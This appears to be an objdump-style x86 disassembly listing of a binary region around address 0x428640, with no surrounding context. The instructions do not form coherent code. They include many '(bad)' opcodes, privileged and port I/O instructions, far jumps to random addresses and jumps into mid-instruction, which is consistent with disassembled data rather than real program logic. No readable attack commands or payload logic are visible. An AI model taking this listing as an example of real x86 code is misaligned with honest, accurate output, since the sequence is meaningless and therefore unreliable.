  42863e:	xchg   ebx,eax
  42863f:	std    
  428640:	sub    al,bl
  428642:	lahf   
  428643:	mov    BYTE PTR [esi-0x4b],bl
  428646:	test   BYTE PTR [edi+ebp*2+0x679b1957],dl
  42864d:	pop    edx
  42864e:	cmp    BYTE PTR [edx+0x61597983],0x39
  428655:	into   
  428656:	outs   dx,BYTE PTR ds:[esi]
  428657:	xchg   edi,eax
  428658:	mov    DWORD PTR fs:0x9ae0ed2b,esi
  42865f:	cmp    ebp,eax
  428661:	cmp    eax,0x4f2ca1a5
  428666:	scas   al,BYTE PTR es:[edi]
  428667:	mov    edx,0x501cad70
  42866c:	pop    edi
  42866d:	lods   eax,DWORD PTR ds:[esi]
  42866e:	mov    cl,0xeb
  428670:	adc    eax,esi
  428672:	jge    0x42867d
  428674:	cmp    eax,0xefa1766b
  428679:	xor    ah,BYTE PTR [ebx-0x67cf38fd]
  42867f:	pop    eax
  428680:	pop    esi
  428681:	stos   DWORD PTR es:[edi],eax
  428682:	pop    es
  428683:	push   ds
  428684:	jbe    0x42868b
  428686:	dec    edx
  428687:	shl    bh,0x65
  42868a:	xor    BYTE PTR [eax+0x18f01ede],0x8e
  428691:	dec    edx
  428692:	test   al,0x2e
  428694:	pop    esi
  428695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428696:	add    eax,0x99a2f5d
  42869b:	daa    
  42869c:	push   esi
  42869d:	popa   
  42869e:	nop
  42869f:	rcl    dl,0x3d
  4286a2:	popf   
  4286a3:	mov    bl,0x13
  4286a5:	adc    eax,0xff8e14e7
  4286aa:	mov    bh,0x74
  4286ac:	ds cmp al,0x3d
  4286af:	inc    ebx
  4286b0:	sub    eax,0x59a15b28
  4286b5:	ffreep st(6)
  4286b7:	jo     0x428726
  4286b9:	adc    esi,DWORD PTR [esi-0x78]
  4286bc:	pop    edi
  4286bd:	int    0xfe
  4286bf:	push   edx
  4286c0:	mov    eax,0xd440f3c1
  4286c5:	xcrypt-cfb (bad)
  4286c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286c7:	mov    ds:0x661e63bc,eax
  4286cc:	sbb    al,0xb0
  4286ce:	ss in  eax,0x19
  4286d1:	cli    
  4286d2:	out    dx,al
  4286d3:	adc    edi,esi
  4286d5:	call   0x9a66:0x2f2901ef
  4286dc:	rol    BYTE PTR ds:0x84df442f,cl
  4286e2:	or     BYTE PTR [ebx+eax*4-0x1f52ea20],al
  4286e9:	jns    0x4286db
  4286eb:	in     eax,dx
  4286ec:	jbe    0x428681
  4286ee:	mov    al,0xa0
  4286f0:	pusha  
  4286f1:	push   edi
  4286f2:	jp     0x42867a
  4286f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286f5:	pusha  
  4286f6:	dec    ebx
  4286f7:	rcr    DWORD PTR [eax-0x24],cl
  4286fa:	aam    0x91
  4286fc:	jb     0x4286ab
  4286fe:	out    dx,al
  4286ff:	mov    ch,0x4e
  428701:	(bad)  
  428702:	lea    edi,[eax]
  428704:	push   0xfffffffe
  428706:	lds    esp,FWORD PTR [eax-0x598b5f2e]
  42870c:	lock sbb DWORD PTR [esi+0x26],ebx
  428710:	lock or esp,DWORD PTR [eax+0x3e]
  428714:	hlt    
  428715:	xchg   esi,ebp
  428717:	push   0xffffffc6
  428719:	aas    
  42871a:	mov    ds:0xa05b548a,al
  42871f:	cmc    
  428720:	or     ah,BYTE PTR [ecx-0x42]
  428723:	stos   BYTE PTR es:[edi],al
  428724:	shl    DWORD PTR [ebx+edi*8],1
  428727:	jecxz  0x428743
  428729:	cs push esp
  42872b:	enter  0xc85e,0xf4
  42872f:	xchg   esp,eax
  428730:	lahf   
  428731:	add    DWORD PTR [eax-0x489eaf7c],esi
  428737:	call   0x34d08052
  42873c:	test   al,0x72
  42873e:	out    dx,al
  42873f:	pushf  
  428740:	sti    
  428741:	xchg   ecx,eax
  428742:	pop    esp
  428743:	pop    ds
  428744:	mov    dh,0x9a
  428746:	xchg   dl,dh
  428748:	jl     0x42879b
  42874a:	cmp    eax,0x4e6bf1d2
  42874f:	imul   ebx,DWORD PTR [ecx+0x37ba4142],0x7290099e
  428759:	(bad)  
  42875a:	outs   dx,BYTE PTR ds:[esi]
  42875b:	jne    0x4287ca
  42875d:	jns    0x42877f
  42875f:	lds    esi,FWORD PTR [ecx+eax*2+0x6e]
  428763:	xchg   esi,eax
  428764:	adc    DWORD PTR [eax-0x75],esp
  428767:	xchg   ecx,eax
  428768:	mov    BYTE PTR [esi-0x797e8e97],bh
  42876e:	out    dx,al
  42876f:	sbb    BYTE PTR [ecx],al
  428771:	sbb    al,0x58
  428773:	inc    eax
  428774:	add    BYTE PTR [esi],al
  428776:	in     eax,dx
  428777:	mov    eax,ds:0xdd4845e3
  42877c:	adc    eax,edi
  42877e:	popa   
  42877f:	jne    0x42872c
  428781:	(bad)  
  428783:	mov    ds:0xfa1bbf07,eax
  428788:	ds jno 0x4287f0
  42878b:	pop    esi
  42878c:	test   eax,0xfea50360
  428791:	sub    BYTE PTR [edx],0x47
  428794:	sti    
  428795:	les    esp,FWORD PTR [esi-0x7f]
  428798:	test   BYTE PTR ds:0x378333ee,bl
  42879e:	pop    esp
  42879f:	int3   
  4287a0:	mov    cs,WORD PTR ds:0x2163a170
  4287a6:	aaa    
  4287a7:	fild   QWORD PTR [edx]
  4287a9:	clc    
  4287aa:	xor    BYTE PTR [ecx+0xfc7df52],dh
  4287b0:	fwait
  4287b1:	pop    eax
  4287b2:	and    esi,DWORD PTR [eax]
  4287b4:	out    dx,al
  4287b5:	add    ch,BYTE PTR [ebx+0x85f9131]
  4287bb:	fwait
  4287bc:	cmp    BYTE PTR [ebx+0x7d],ch
  4287bf:	or     eax,0xeb1cb142
  4287c4:	pop    esi
  4287c5:	adc    eax,0x16db3b77
  4287ca:	mov    ebx,0x6a61529e
  4287cf:	pushf  
  4287d0:	pop    ebp
  4287d1:	rcr    DWORD PTR [esi-0x1a64b35d],1
  4287d7:	and    BYTE PTR [esi+0xf],bl
  4287da:	xor    al,0x86
  4287dc:	inc    esi
  4287dd:	sub    BYTE PTR [ebx],dl
  4287df:	stc    
  4287e0:	daa    
  4287e1:	inc    ecx
  4287e2:	dec    eax
  4287e3:	ret    
  4287e4:	push   ecx
  4287e5:	mov    esi,0xba5ea4a8
  4287ea:	jns    0x42882a
  4287ec:	mov    edx,eax
  4287ee:	mov    ecx,0x1ec0a834
  4287f3:	lock dec esp
  4287f5:	popa   
  4287f6:	mov    al,ds:0xa71fcf37
  4287fb:	xor    DWORD PTR [ebx-0x33d411ff],esi
  428801:	pop    edx
  428802:	pop    esp
  428803:	stos   BYTE PTR es:[edi],al
  428804:	aaa    
  428805:	push   eax
  428806:	fbld   TBYTE PTR [eax-0x197fff61]
  42880c:	mov    ch,0x61
  42880e:	sbb    dh,BYTE PTR [esi+0x6a]
  428811:	rol    BYTE PTR [edx],cl
  428813:	icebp  
  428814:	test   eax,0xc4872e95
  428819:	in     eax,dx
  42881a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42881b:	jne    0x4287e3
  42881d:	pusha  
  42881e:	and    DWORD PTR [ebx+0x0],edi
  428821:	sub    eax,0xe43c8e31
  428826:	jmp    0x9f6a:0x35ce70fe
  42882d:	cmp    al,BYTE PTR [edi-0x2df07da7]
  428833:	mov    al,ds:0xb85b0327
  428838:	mov    esp,DWORD PTR [ebp-0x55]
  42883b:	mov    cl,0x5e
  42883d:	sub    eax,0x476dcdec
  428842:	lea    ebx,[edx+0x72ba5224]
  428848:	fsub   st(2),st
  42884a:	out    dx,al
  42884b:	(bad)
  42884f:	sub    dh,BYTE PTR [ebx]
  428851:	fisttp QWORD PTR [ecx-0x58]
  428854:	pop    ebp
  428855:	or     ch,bh
  428857:	aaa    
  428858:	sbb    DWORD PTR [ecx-0x32a59092],ecx
  42885e:	push   0xfcd09769
  428863:	mov    al,ds:0x47dbc017
  428868:	mov    ebp,0x5ec5358b
  42886d:	(bad)  [ebp+0x3be81519]
  428873:	pushf  
  428874:	test   eax,0x6a8a6f51
  428879:	mov    ds:0x18c98e0e,al
  42887e:	and    eax,0x24def5e
  428883:	inc    ebp
  428884:	pusha  
  428885:	jne    0x428809
  428887:	fistp  DWORD PTR [esi-0x6abd82ee]
  42888d:	xor    eax,0xc764a161
  428892:	into   
  428893:	call   0x96972591
  428898:	push   cs
  428899:	nop
  42889a:	daa    
  42889b:	sub    eax,0x38ab725b
  4288a0:	dec    esi
  4288a1:	add    eax,DWORD PTR ds:0x2e876726
  4288a7:	jp     0x428928
  4288a9:	imul   esp,DWORD PTR [eax+0x964fba1],0xffffff90
  4288b0:	xchg   esp,eax
  4288b1:	and    al,BYTE PTR [ebx]
  4288b3:	adc    al,0x5e
  4288b5:	or     esp,ecx
  4288b7:	add    al,0xae
  4288b9:	test   DWORD PTR [edi],esp
  4288bb:	imul   eax,DWORD PTR ds:0xd89fe92d,0xffffffbf
  4288c2:	or     al,0x94
  4288c4:	inc    BYTE PTR [ebx]
  4288c6:	shr    BYTE PTR [ecx+eiz*1],0x45
  4288ca:	in     eax,dx
  4288cb:	mov    cl,0x58
  4288cd:	mov    bh,0x38
  4288cf:	enter  0xea48,0x1e
  4288d3:	retf   
  4288d4:	out    0x78,eax
  4288d6:	pop    ebp
  4288d7:	sbb    cl,BYTE PTR [edx+0x5038d05f]
  4288dd:	int    0xf0
  4288df:	mov    edi,DWORD PTR [esi-0x54]
  4288e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288e3:	push   eax
  4288e4:	push   edx
  4288e5:	loopne 0x4288d1
  4288e7:	adc    bl,BYTE PTR [esi]
  4288e9:	jno    0x428929
  4288eb:	sbb    edi,DWORD PTR [esi+0x39a1281f]
  4288f1:	cs in  al,0x15
  4288f4:	lahf   
  4288f5:	jns    0x4288e8
  4288f7:	cs pop ecx
  4288f9:	or     cl,BYTE PTR [edx+0x2e02b9a7]
  4288ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428900:	ficomp DWORD PTR [edx]
  428902:	xchg   ebp,eax
  428903:	lea    ecx,[ecx+ebp*2]
  428906:	sbb    ah,BYTE PTR [ecx+0x6dda1054]
  42890c:	jb     0x4288cf
  42890e:	out    dx,al
  42890f:	jp     0x42892a
  428911:	jecxz  0x42895d
  428913:	pop    ss
  428914:	aad    0x11
  428916:	stos   DWORD PTR es:[edi],eax
  428917:	mov    eax,ds:0xc77a4cdf
  42891c:	scas   eax,DWORD PTR es:[edi]
  42891d:	cdq    
  42891e:	push   0x71
  428920:	or     BYTE PTR [ecx+0x621349ee],dh
  428926:	dec    ebp
  428927:	and    ah,ch
  428929:	push   ss
  42892a:	lahf   
  42892b:	mov    ?,WORD PTR [ebp-0x2d209192]
  428931:	jle    0x4289a1
  428933:	ins    BYTE PTR es:[edi],dx
  428934:	or     eax,0x5d8217cd
  428939:	push   es
  42893a:	addr16 aam 0xf8
  42893d:	fucomp st(0)
  42893f:	iret   
  428940:	push   0xffffffeb
  428942:	pop    ebx
  428943:	mov    eax,ds:0x78431e7e
  428948:	pushf  
  428949:	mov    ah,0x1
  42894b:	fistp  WORD PTR [esi-0x8]
  42894e:	clc    
  42894f:	xchg   ebp,eax
  428950:	ja     0x4288d4
  428952:	hlt    
  428953:	outs   dx,BYTE PTR ds:[esi]
  428954:	mov    ebp,0x40ae8a27
  428959:	or     ah,BYTE PTR [edi-0x20]
  42895c:	scas   al,BYTE PTR es:[edi]
  42895d:	mov    WORD PTR [ebx],ss
  42895f:	mov    cl,0xde
  428961:	jnp    0x4288fc
  428963:	dec    ebp
  428964:	pop    esi
  428965:	outs   dx,DWORD PTR ds:[esi]
  428966:	std    
  428967:	add    DWORD PTR [eax-0x69],ebx
  42896a:	cmp    DWORD PTR [edx],edi
  42896c:	xchg   ebx,eax
  42896d:	pusha  
  42896e:	lahf   
  42896f:	fmul   DWORD PTR [esi-0x44]
  428972:	push   ebp
  428973:	in     eax,0x32
  428975:	mov    cl,0xe7
  428977:	adc    eax,0x89fded3e
  42897c:	outs   dx,BYTE PTR ds:[esi]
  42897d:	push   ss
  42897e:	aam    0xf8
  428980:	mov    eax,0x22a38160
  428985:	sti    
  428986:	into   
  428987:	jmp    0x9630eb6f
  42898c:	arpl   WORD PTR [ebp+0x5861e653],dx
  428992:	data16 jae 0x4289bd
  428995:	popa   
  428996:	mov    ds:0xfb630a5b,eax
  42899b:	into   
  42899c:	push   ecx
  42899d:	sbb    dh,ch
  42899f:	out    0xde,al
  4289a1:	sub    BYTE PTR [edi],bh
  4289a3:	cmp    ch,BYTE PTR ds:0x45ae1a14
  4289a9:	mov    al,ds:0x21906aee
  4289ae:	cdq    
  4289af:	sbb    ebp,DWORD PTR [edi-0x16331153]
  4289b5:	shl    DWORD PTR ds:0xfa38ebe3,0xa0
  4289bc:	sbb    BYTE PTR [eax+edx*4+0x35],ah
  4289c0:	xor    al,0xd3
  4289c2:	clc    
  4289c3:	dec    ebx
  4289c4:	pop    edi
  4289c5:	es in  eax,dx
  4289c7:	xor    ch,BYTE PTR [esi+ebx*1-0x51]
  4289cb:	cmp    BYTE PTR [ebx+0x3a],ch
  4289ce:	and    eax,0xdd193ca1
  4289d3:	and    al,0x8c
  4289d5:	clc    
  4289d6:	mov    bl,0x6a
  4289d8:	push   edx
  4289d9:	or     al,BYTE PTR [ebx+edi*1]
  4289dc:	pop    esi
  4289dd:	sbb    ch,ch
  4289df:	jmp    0xbb1f:0xa20db89d
  4289e6:	sti    
  4289e7:	xchg   ebp,eax
  4289e8:	hlt    
  4289e9:	int3   
  4289ea:	mov    edi,DWORD PTR [eax-0x2a]
  4289ed:	out    0xe,al
  4289ef:	ins    DWORD PTR es:[edi],dx
  4289f0:	pop    ebx
  4289f1:	pop    esp
  4289f2:	jge    0x428a46
  4289f4:	mov    eax,ds:0x2dc3df0b
  4289f9:	sbb    eax,DWORD PTR [ecx+edx*2-0x5b716069]
  428a00:	sub    DWORD PTR [ebx+0x644415d4],ebp
  428a06:	data16 mov ds:0xcbe36621,al
  428a0c:	jmp    0x428a87
  428a0e:	out    dx,al
  428a0f:	cwde   
  428a10:	sahf   
  428a11:	call   0xc21acb84
  428a16:	jle    0x4289bc
  428a18:	enter  0x9b9a,0x5a
  428a1c:	je     0x428a66
  428a1e:	ins    BYTE PTR es:[edi],dx
  428a1f:	retf   0x621e
  428a22:	(bad)  
  428a23:	pop    esp
  428a24:	pop    esi
  428a25:	dec    eax
  428a26:	and    al,0x6a
  428a28:	dec    edx
  428a29:	into   
  428a2a:	jle    0x428a18
  428a2c:	mov    dh,0xa6
  428a2e:	out    dx,eax
  428a2f:	mov    eax,ds:0xef9f1654
  428a34:	ins    BYTE PTR es:[edi],dx
  428a35:	mov    edx,0x370301a2
  428a3a:	ret    0x11a9
  428a3d:	popa   
  428a3e:	mov    esi,DWORD PTR [ecx-0x5e]
  428a41:	xchg   edx,eax
  428a42:	adc    ah,cl
  428a44:	or     eax,0xdbd71f61
  428a49:	jecxz  0x4289f5
  428a4b:	sbb    DWORD PTR [edx+0x866eb2b],0xa791ea01
  428a55:	fsub   DWORD PTR [edx]
  428a57:	inc    esi
  428a58:	inc    ebp
  428a59:	pop    edx
  428a5a:	ins    DWORD PTR es:[edi],dx
  428a5b:	(bad)  [edi+ebx*2-0x30e3aed0]
  428a62:	cmp    al,0x81
  428a64:	pop    esi
  428a65:	inc    esp
  428a66:	mov    ecx,0x37184c75
  428a6b:	mov    ah,0x3c
  428a6d:	popa   
  428a6e:	push   esp
  428a6f:	lods   al,BYTE PTR ds:[esi]
  428a70:	stc    
  428a71:	xlat   BYTE PTR ds:[ebx]
  428a72:	stos   BYTE PTR es:[edi],al
  428a73:	fwait
  428a74:	add    dh,BYTE PTR [ebp-0x12]
  428a77:	and    eax,0x637363ec
  428a7c:	pop    edx
  428a7d:	in     eax,dx
  428a7e:	cmc    
  428a7f:	mov    al,ds:0xbf636932
  428a84:	(bad)  
  428a86:	mov    ds:0x86c660ed,al
  428a8b:	cmp    esi,esi
  428a8d:	mov    esp,0x647e785d
  428a92:	push   esi
  428a93:	xor    DWORD PTR [esi+0x24],ebx
  428a96:	jge    0x428b0b
  428a98:	or     cl,ah
  428a9a:	push   ss
  428a9b:	sbb    ebp,DWORD PTR [eax+0x61]
  428a9e:	fisttp QWORD PTR [esi-0x14]
  428aa1:	cmp    BYTE PTR [ebx+0x52],ch
  428aa4:	jmp    0x64a2:0x82c3ee2d
  428aab:	push   edi
  428aac:	arpl   bx,dx
  428aae:	sbb    BYTE PTR [ecx+eax*4+0x70ae37],ah
  428ab5:	add    eax,0x3178a149
  428aba:	sbb    BYTE PTR [si-0x68],al
  428abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428abf:	fcomp  QWORD PTR [esi+0x40]
  428ac2:	enter  0xb4b0,0xd5
  428ac6:	test   al,0xc0
  428ac8:	adc    DWORD PTR [ecx-0x1c],esp
  428acb:	and    DWORD PTR [edx+edx*4-0x6d],edx
  428acf:	daa    
  428ad0:	xor    eax,0x5e38db97
  428ad5:	or     edi,eax
  428ad7:	in     al,0x62
  428ad9:	jle    0x428ad4
  428adb:	and    DWORD PTR [esp+eiz*4-0x681632e1],0xffffffee
  428ae3:	pusha  
  428ae4:	push   es
  428ae5:	int3   
  428ae6:	(bad)  
  428ae7:	xchg   ebx,eax
  428ae8:	pop    ebp
  428ae9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428aea:	out    dx,al
  428aeb:	jae    0x428a7f
  428aed:	gs loop 0x428b4d
  428af0:	add    dh,al
  428af2:	mov    cl,0xa0
  428af4:	icebp  
  428af5:	mov    ch,0x38
  428af7:	sbb    cl,bh
  428af9:	pop    ss
  428afa:	jmp    0x428ac4
  428afc:	pop    esi
  428afd:	xchg   edx,eax
  428afe:	sbb    DWORD PTR ds:0x8f8de085,eax
  428b04:	push   0x60
  428b06:	push   edx
  428b07:	mov    cl,0x83
  428b09:	push   esi
  428b0a:	lock dec esi
  428b0c:	ficomp DWORD PTR [ebx]
  428b0e:	mov    dh,0xe4
  428b10:	(bad)  
  428b11:	push   ecx
  428b12:	inc    esi
  428b13:	jle    0x428adc
  428b15:	inc    eax
  428b16:	jl     0x428add
  428b18:	(bad)  
  428b1a:	popa   
  428b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b1c:	int3   
  428b1d:	fldenv [ebp-0x5b]
  428b20:	lods   eax,DWORD PTR ds:[esi]
  428b21:	(bad)  
  428b22:	and    ch,BYTE PTR [ebp+0x6d9fe12e]
  428b28:	sub    al,0xd8
  428b2a:	lods   eax,DWORD PTR ds:[esi]
  428b2b:	ins    DWORD PTR es:[edi],dx
  428b2c:	mov    dl,0x24
  428b2e:	arpl   bp,cx
  428b30:	repnz mov gs,esi
  428b33:	and    eax,0x3e4edc84
  428b38:	jecxz  0x428ba5
  428b3a:	jmp    0x6e3d9284
  428b3f:	rcr    DWORD PTR [esi-0x17e2c191],1
  428b45:	neg    bx
  428b48:	pop    edx
  428b49:	jg     0x428b15
  428b4b:	ret    
  428b4c:	mov    ah,BYTE PTR [eax+0x291d8a30]
  428b52:	out    dx,al
  428b53:	inc    ebp
  428b54:	int3   
  428b55:	(bad)  [edi]
  428b57:	jno    0x428ae2
  428b59:	rol    dl,cl
  428b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428b5c:	mov    WORD PTR [edi-0xf52b010],?
  428b62:	inc    ebx
  428b63:	shl    edi,1
  428b65:	lods   al,BYTE PTR ds:[esi]
  428b66:	lock xchg ebx,eax
  428b68:	daa    
  428b69:	jmp    0x915cccb5
  428b6e:	dec    edi
  428b6f:	repnz test BYTE PTR [edx+edx*8+0xb],0xb9
  428b75:	or     BYTE PTR [eax+ebp*4-0x1a0a0768],dh
  428b7c:	push   ecx
  428b7d:	adc    ch,BYTE PTR [ebp+0x185f7ed5]
  428b83:	and    DWORD PTR [esi-0x40],ebx
  428b86:	dec    edx
  428b87:	cli    
  428b88:	in     eax,0xfd
  428b8a:	jnp    0x428ba7
  428b8c:	test   eax,0x5429e35d
  428b91:	inc    esi
  428b92:	std    
  428b93:	xchg   BYTE PTR fs:[esi],cl
  428b96:	jb     0x428b37
  428b98:	cmc    
  428b99:	test   dh,ch
  428b9b:	xchg   ecx,edx
  428b9d:	sub    BYTE PTR [edi+0x7913cc42],cl
  428ba3:	cwde   
  428ba4:	or     esi,DWORD PTR [esi]
  428ba6:	pushf  
  428ba7:	mov    eax,ds:0xba017014
  428bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428bad:	stos   BYTE PTR es:[edi],al
  428bae:	mov    dh,0xe6
  428bb0:	(bad)  [eax+0x71]
  428bb3:	out    dx,al
  428bb4:	lock mov edi,0xf587a864
  428bba:	popa   
  428bbb:	outs   dx,DWORD PTR ds:[esi]
  428bbc:	jmp    0x4eb42511
  428bc1:	cmp    al,BYTE PTR [eax]
  428bc3:	cmp    dh,cl
  428bc5:	cs scas al,BYTE PTR es:[edi]
  428bc7:	inc    edi
  428bc8:	inc    esi
  428bc9:	out    0x7b,al
  428bcb:	arpl   WORD PTR [ecx+esi*1],dx
  428bce:	in     al,0xa0
  428bd0:	jne    0x428c0e
  428bd2:	pop    edx
  428bd3:	add    DWORD PTR [ecx+0x1f],ebx
  428bd6:	push   ebp
  428bd7:	(bad)  
  428bd8:	pop    esi
  428bd9:	xor    eax,0x2fe49d6a
  428bde:	xchg   ebp,eax
  428bdf:	addr16 inc edx
  428be1:	popa   
  428be2:	jne    0x428bd5
  428be4:	cmc    
  428be5:	push   ecx
  428be6:	jmp    0x9a3d:0xee6bbf3b
  428bed:	sar    DWORD PTR [edx],1
  428bef:	sbb    eax,0xa19750b9
  428bf4:	in     al,dx
  428bf5:	loop   0x428c63
  428bf7:	shl    DWORD PTR [ebx+0x45],1
  428bfa:	aam    0x58
  428bfc:	pop    esi
  428bfd:	sbb    eax,DWORD PTR [esi+edx*1-0x52]
  428c01:	dec    esi
  428c02:	mov    BYTE PTR [ebx-0x51],0x52
  428c06:	loope  0x428c30
  428c08:	sbb    ebp,DWORD PTR [ebp-0x59]
  428c0b:	iret   
  428c0c:	fwait
  428c0d:	shl    ch,1
  428c0f:	lea    edx,[edx-0x3e96daec]
  428c15:	loopne 0x428c3b
  428c17:	(bad)  
  428c18:	mov    esi,0xe8a89a8f
  428c1d:	pusha  
  428c1e:	rcr    DWORD PTR [esi+0x27776c7b],1
  428c24:	mov    bh,ch
  428c26:	lock mov edx,0x21598e94
  428c2c:	pop    eax
  428c2d:	and    al,0xea
  428c2f:	jmp    0x428c23
  428c31:	pusha  
  428c32:	enter  0xd2fc,0x19
  428c36:	add    eax,0xf7091516
  428c3b:	and    al,0xd8
  428c3d:	aam    0xee
  428c3f:	xor    eax,0x8565d119
  428c44:	mov    ebx,0x564eed60
  428c49:	ss mov dl,0x87
  428c4c:	push   ebp
  428c4d:	jecxz  0x428c3d
  428c4f:	sahf   
  428c50:	cld    
  428c51:	mov    bl,0x13
  428c53:	test   al,0x4a
  428c55:	pop    esi
  428c56:	or     esp,DWORD PTR [ecx+0x677ee901]
  428c5c:	add    esp,edi
  428c5e:	sub    eax,0xb20c5e8b
  428c63:	pop    ebp
  428c64:	and    eax,0xdfa60c2b
  428c69:	pusha  
  428c6a:	pop    ds
  428c6b:	xchg   DWORD PTR [ebp-0x23b5794e],esi
  428c71:	mov    bl,0xee
  428c73:	pop    eax
  428c74:	cs ret 
  428c76:	cwde   
  428c77:	bound  esi,QWORD PTR [di-0x5335]
  428c7c:	out    dx,eax
  428c7d:	test   bh,ch
  428c7f:	loopne 0x428c19
  428c81:	dec    ecx
  428c82:	pop    edi
  428c83:	loope  0x428c5e
  428c85:	cld    
  428c86:	inc    esi
  428c87:	pop    esi
  428c88:	jmp    0x66a5:0xdf39e797
  428c8f:	in     al,dx
  428c90:	jle    0x428c1b
  428c92:	or     esp,edx
  428c94:	jb     0x428cf6
  428c96:	popa   
  428c97:	push   ecx
  428c98:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  428c9a:	imul   esi,DWORD PTR [ecx*2+0x43abeef9],0x2a551239
  428ca5:	adc    bh,BYTE PTR [eax]
  428ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ca8:	mov    ds:0xa0a2b1d6,eax
  428cad:	int3   
  428cae:	out    dx,al
  428caf:	jno    0x428d2b
  428cb1:	sbb    edi,esp
  428cb3:	add    eax,0xa0bbf33f
  428cb8:	sbb    ch,BYTE PTR [eax]
  428cba:	and    ah,bh
  428cbc:	daa    
  428cbd:	and    dh,bl
  428cbf:	int3   
  428cc0:	pop    esi
  428cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428cc2:	sbb    eax,0xa2270c0d
  428cc7:	mov    al,0x75
  428cc9:	pusha  
  428cca:	push   ebx
  428ccb:	in     eax,dx
  428ccc:	icebp  
  428ccd:	icebp  
  428cce:	test   BYTE PTR [edi-0xd],ch
  428cd1:	sbb    DWORD PTR [esi-0x11294226],edi
  428cd7:	xchg   cl,ah
  428cd9:	fs push ss
  428cdb:	addr16 mov esi,0x258f7e4e
  428ce1:	mov    esi,0x4b112160
  428ce6:	ret    
  428ce7:	fild   WORD PTR [edx]
  428ce9:	jae    0x428d0b
  428ceb:	jae    0x428c81
  428ced:	fst    DWORD PTR [esi+0x4d516f72]
  428cf3:	loop   0x428cee
  428cf5:	mov    dl,0x51
  428cf7:	adc    eax,0xa14aa59e
  428cfc:	fnstenv [edi+0x22]
  428cff:	(bad)  
  428d00:	stos   BYTE PTR es:[edi],al
  428d01:	jmp    0xa1ab:0xa35ea8ac
  428d08:	aas    
  428d09:	fcomp  DWORD PTR [ebx+0x30]
  428d0c:	subps  xmm6,XMMWORD PTR [ecx]
  428d0f:	cmp    ecx,DWORD PTR [ecx]
  428d11:	inc    esp
  428d12:	das    
  428d13:	mov    eax,ds:0xba235ea2
  428d18:	push   0x69
  428d1a:	out    dx,eax
  428d1b:	mov    bl,0xd5
  428d1d:	cmp    BYTE PTR [ecx+eax*8],ch
  428d20:	mov    BYTE PTR [ecx],dh
  428d22:	xchg   BYTE PTR [eax],cl
  428d24:	arpl   WORD PTR [edx-0x62],bx
  428d27:	sbb    al,dh
  428d29:	cwde   
  428d2a:	mov    esi,0xfe23a930
  428d2f:	jbe    0x428d68
  428d31:	xor    BYTE PTR [eax],0x21
  428d34:	bound  ecx,QWORD PTR [ebp+0x6e]
  428d37:	pop    ss
  428d38:	aam    0x21
  428d3a:	cwde   
  428d3b:	mov    ds:0x160eaf29,al
  428d40:	jb     0x428d49
  428d42:	mov    esi,DWORD PTR [ecx+0x49]
  428d45:	dec    ebx
  428d46:	pop    ds
  428d47:	pop    edi
  428d48:	inc    ebp
  428d49:	loope  0x428d98
  428d4b:	dec    eax
  428d4c:	test   BYTE PTR ds:0x613e26ad,al
  428d52:	xor    al,0x8d
  428d54:	das    
  428d55:	xlat   BYTE PTR ds:[ebx]
  428d56:	and    DWORD PTR ds:0xe9e7402d,edi
  428d5c:	jbe    0x428cef
  428d5e:	arpl   sp,si
  428d60:	push   cs
  428d61:	call   0x16f9:0x44fc9dda
  428d68:	jno    0x428dc8
  428d6a:	inc    eax
  428d6b:	in     al,dx
  428d6c:	enter  0xcd78,0xe7
  428d70:	hlt    
  428d71:	pushf  
  428d72:	mov    ebx,0x687b5ef9
  428d77:	mov    ch,0x48
  428d79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d7a:	(bad)  
  428d7b:	jg     0x428d2c
  428d7d:	and    DWORD PTR [edx-0x3e7b160],ebp
  428d83:	mov    WORD PTR [esi],ss
  428d85:	sbb    DWORD PTR [eax],0xbadc4bde
  428d8b:	lock pop esi
  428d8d:	or     BYTE PTR [eax+0x10f59a20],0xa1
  428d94:	xchg   edx,eax
  428d95:	scas   eax,DWORD PTR es:[edi]
  428d96:	pusha  
  428d97:	push   ebx
  428d98:	inc    edi
  428d99:	js     0x428d48
  428d9b:	imul   ebx,DWORD PTR [esi-0x24],0x3ca55c4b
  428da2:	ins    BYTE PTR es:[edi],dx
  428da3:	mov    dh,0x98
  428da5:	pusha  
  428da6:	ret    0xbcfd
  428da9:	retf   
  428daa:	push   es
  428dab:	xor    BYTE PTR [eax],bh
  428dad:	in     al,0x66
  428daf:	popf   
  428db0:	arpl   WORD PTR [eax+0x2a],di
  428db3:	push   esi
  428db4:	mov    ebx,0x71efb4e0
  428db9:	dec    edx
  428dba:	out    0xa0,al
  428dbc:	fimul  DWORD PTR [esi-0x53]
  428dbf:	test   DWORD PTR ds:0xef0382aa,eax
  428dc5:	adc    ch,dh
  428dc7:	sar    ch,1
  428dc9:	dec    ebx
  428dca:	mov    dh,0x2b
  428dcc:	(bad)  [eax]
  428dce:	push   ss
  428dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428dd0:	pop    ebx
  428dd1:	ss and al,0x41
  428dd4:	cdq    
  428dd5:	lahf   
  428dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428dd7:	inc    esp
  428dd8:	jmp    0x4bd87c62
  428ddd:	mov    esp,0x9f570c9d
  428de2:	push   ebp
  428de3:	mov    eax,ds:0x16666718
  428de8:	div    DWORD PTR [ecx]
  428dea:	push   0x41
  428dec:	pop    esi
  428ded:	adc    BYTE PTR [ebp+edx*4-0x25],dh
  428df1:	push   ss
  428df2:	xlat   BYTE PTR ds:[ebx]
  428df3:	and    al,BYTE PTR [edx]
  428df5:	arpl   WORD PTR [ebx-0x5a],bp
  428df8:	ficomp WORD PTR [edx]
